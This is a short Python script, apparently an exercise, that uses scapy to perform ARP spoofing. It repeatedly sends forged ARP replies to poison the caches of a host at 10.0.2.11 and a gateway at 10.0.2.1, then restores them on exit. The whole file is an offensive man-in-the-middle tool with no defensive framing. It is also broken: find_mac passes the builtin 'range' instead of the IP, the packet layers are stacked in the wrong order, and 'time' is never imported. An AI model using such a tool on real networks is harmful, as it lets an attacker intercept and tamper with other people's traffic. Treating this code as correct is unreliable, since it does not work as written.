#!/usr/bin/python3

import scapy.all as scapy

def send_packet(target_ip, spoof_ip):
    target_mac = find_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def find_mac(ip):
    arp_header = scapy.ARP(pdst = range)
    broadcast_header = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet_to_send = arp_header/broadcast_header
    result = scapy.srp(packet_to_send,timeout = 2, verbose=False)[0]
    return result[0][1].hwsrc

def restore(target_ip, source_ip):
    target_mac = find_mac(target_ip)
    source_mac = find_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

counter = 0

target = "10.0.2.11"
source = "10.0.2.1"

try:
    while True:
        send_packet(target, source)
        send_packet(source, target)
        counter+=2
        print("\r[+] Packets sent: " + str(counter), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nEnding...")
    restore(target, source)
    restore(source, target)
